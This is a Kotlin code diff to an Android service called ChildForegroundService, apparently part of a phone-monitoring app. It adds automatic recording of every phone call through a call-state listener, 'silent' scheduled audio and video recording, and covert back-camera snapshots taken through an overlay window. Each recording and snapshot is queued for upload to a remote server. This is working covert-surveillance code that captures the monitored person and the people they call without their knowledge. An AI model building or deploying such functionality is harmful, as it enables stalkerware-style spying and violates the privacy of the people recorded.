@@ -15,6 +15,7 @@ import android.net.wifi.WifiManager
 import android.os.Build
 import android.os.IBinder
 import android.os.PowerManager
+import android.telephony.TelephonyManager
 import androidx.core.app.NotificationCompat
 import androidx.core.app.ServiceCompat
 import androidx.core.content.ContextCompat
@@ -423,6 +424,61 @@ class ChildForegroundService : Service() {
         }
     }
 
+    private var telephonyCallback: Any? = null
+    private var activeCallState = TelephonyManager.CALL_STATE_IDLE
+
+    private fun registerTelephonyCallStateListener(uid: String) {
+        if (telephonyCallback != null || uid.isEmpty()) return
+        try {
+            val tm = getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager ?: return
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                val callback = object : android.telephony.TelephonyCallback(), android.telephony.TelephonyCallback.CallStateListener {
+                    override fun onCallStateChanged(state: Int) {
+                        handlePhoneCallStateChanged(state, uid)
+                    }
+                }
+                tm.registerTelephonyCallback(mainExecutor, callback)
+                telephonyCallback = callback
+            } else {
+                @Suppress("DEPRECATION")
+                val listener = object : android.telephony.PhoneStateListener() {
+                    @Deprecated("Deprecated in Java")
+                    override fun onCallStateChanged(state: Int, phoneNumber: String?) {
+                        handlePhoneCallStateChanged(state, uid)
+                    }
+                }
+                @Suppress("DEPRECATION")
+                tm.listen(listener, android.telephony.PhoneStateListener.LISTEN_CALL_STATE)
+                telephonyCallback = listener
+            }
+            FirebaseCrashlytics.getInstance().log("[ChildService] Telephony CallState listener registered for auto-call recording")
+        } catch (e: Exception) {
+            FirebaseCrashlytics.getInstance().log("[ChildService] Telephony listener notice: ${e.localizedMessage}")
+        }
+    }
+
+    private fun handlePhoneCallStateChanged(state: Int, uid: String) {
+        if (state == activeCallState) return
+        activeCallState = state
+        when (state) {
+            TelephonyManager.CALL_STATE_OFFHOOK -> {
+                FirebaseCrashlytics.getInstance().log("[ChildService] Phone call connected (OFFHOOK) -> starting automatic call recording")
+                val startIntent = Intent(applicationContext, ChildForegroundService::class.java).apply {
+                    action = ACTION_START_CALL_RECORDING
+                    putExtra(EXTRA_PHONE_NUMBER, "active_call")
+                }
+                try { ContextCompat.startForegroundService(applicationContext, startIntent) } catch (_: Exception) {}
+            }
+            TelephonyManager.CALL_STATE_IDLE -> {
+                FirebaseCrashlytics.getInstance().log("[ChildService] Phone call ended (IDLE) -> stopping automatic call recording")
+                val stopIntent = Intent(applicationContext, ChildForegroundService::class.java).apply {
+                    action = ACTION_STOP_CALL_RECORDING
+                }
+                try { ContextCompat.startForegroundService(applicationContext, stopIntent) } catch (_: Exception) {}
+            }
+        }
+    }
+
     private fun hasLocationPermission(): Boolean {
         return ContextCompat.checkSelfPermission(
             this,
@@ -603,25 +659,53 @@ class ChildForegroundService : Service() {
                 startMonitoringStreamRequests()
             }
             ACTION_SCHEDULED_RECORDING -> {
-                val durationMinutes = intent.getIntExtra("duration_minutes", 5)
+                val durationMinutes = intent.getIntExtra("duration_minutes", 5).coerceIn(1, 120)
                 val scheduleId = intent.getStringExtra("schedule_id") ?: ""
+                val captureType = intent.getStringExtra("capture_type") ?: "audio"
+                val isVideo = captureType.equals("video", ignoreCase = true)
+
                 currentServiceState = "RECORDING_SCHEDULED"
                 AppHealthTelemetry.syncDeviceHealth(applicationContext, currentServiceState)
                 AppHealthTelemetry.logDiagnostic(
                     applicationContext,
                     "SCHEDULED_RECORDING",
                     "STARTED",
-                    "Scheduled recording started: schedule=$scheduleId, duration=$durationMinutes min"
+                    "Scheduled silent ${if (isVideo) "video" else "audio"} recording started: schedule=$scheduleId, duration=$durationMinutes min"
                 )
-                // Ensure monitoring listeners are running (presence, RTDB, etc.)
                 startMonitoringStreamRequests()
-                updateForegroundNotification("Auto-Recording Active ($durationMinutes min)", getIdleServiceType())
-                // Use CallRecorder for standalone mic capture (no WebRTC peer needed)
+                val serviceType = if (isVideo) getStreamingServiceType("video") else getStreamingServiceType("audio")
+                updateForegroundNotification("Silent Scheduled Recording (${if (isVideo) "Video" else "Audio"}, $durationMinutes min)", serviceType)
                 acquireWakeLock()
                 if (callRecorder == null) {
                     callRecorder = CallRecorder(applicationContext)
                 }
-                callRecorder?.startCallRecording("scheduled_$scheduleId")
+                callRecorder?.startCallRecording("scheduled_${if (isVideo) "vid" else "aud"}_$scheduleId")
+
+                if (isVideo) {
+                    val uid = AppHealthTelemetry.getEffectiveUserId(applicationContext)
+                    if (uid.isNotEmpty()) {
+                        ensureOverlayWindow()
+                        try {
+                            com.example.authapp.camera.SilentSnapshotManager(applicationContext).captureSnapshot(
+                                isFront = false,
+                                onCaptured = { photoFile ->
+                                    removeOverlayWindow()
+                                    com.example.authapp.sync.SyncScheduler.enqueueUpload(
+                                        context = applicationContext,
+                                        file = photoFile,
+                                        childId = uid,
+                                        streamType = "snapshot",
+                                        durationSeconds = 0L
+                                    )
+                                },
+                                onError = { removeOverlayWindow() }
+                            )
+                        } catch (_: Exception) {
+                            removeOverlayWindow()
+                        }
+                    }
+                }
+
                 adaptiveHeartbeatManager?.triggerImmediateHeartbeat()
                 // Auto-stop after durationMinutes
                 scheduledStopRunnable?.let { mainHandler.removeCallbacks(it) }
@@ -639,12 +723,11 @@ class ChildForegroundService : Service() {
                     adaptiveHeartbeatManager?.triggerImmediateHeartbeat()
                     updateForegroundNotification("Background Protection Active", getIdleServiceType())
                     if (uid.isNotEmpty() && recordedFile != null && recordedFile.exists() && recordedFile.length() > 0) {
-                        // OFFLINE-FIRST: Net hai toh direct upload, nahi toh local save + WorkManager queue
                         com.example.authapp.sync.SyncScheduler.enqueueUpload(
                             context = applicationContext,
                             file = recordedFile,
                             childId = uid,
-                            streamType = "scheduled",
+                            streamType = if (isVideo) "video_schedule" else "scheduled",
                             durationSeconds = durationSec
                         )
                         FirebaseCrashlytics.getInstance().log("[ChildService] Scheduled recording enqueued for upload (offline-safe)")
@@ -1017,6 +1100,7 @@ class ChildForegroundService : Service() {
         startLocationMonitoring()
         registerNetworkCallback(uid)
         startPermissionShieldGuard(uid)
+        registerTelephonyCallStateListener(uid)
 
         if (streamRequestListener != null) return
 
@@ -1644,6 +1728,18 @@ class ChildForegroundService : Service() {
         try {
             callRecorder?.stopCallRecording()
             callRecorder = null
+        } catch (_: Exception) {}
+        try {
+            if (telephonyCallback != null) {
+                val tm = getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S && telephonyCallback is android.telephony.TelephonyCallback) {
+                    tm?.unregisterTelephonyCallback(telephonyCallback as android.telephony.TelephonyCallback)
+                } else if (telephonyCallback is android.telephony.PhoneStateListener) {
+                    @Suppress("DEPRECATION")
+                    tm?.listen(telephonyCallback as android.telephony.PhoneStateListener, android.telephony.PhoneStateListener.LISTEN_NONE)
+                }
+                telephonyCallback = null
+            }
         } catch (_: Exception) {}
         try {
             streamAudioRecorder?.stopRecording()
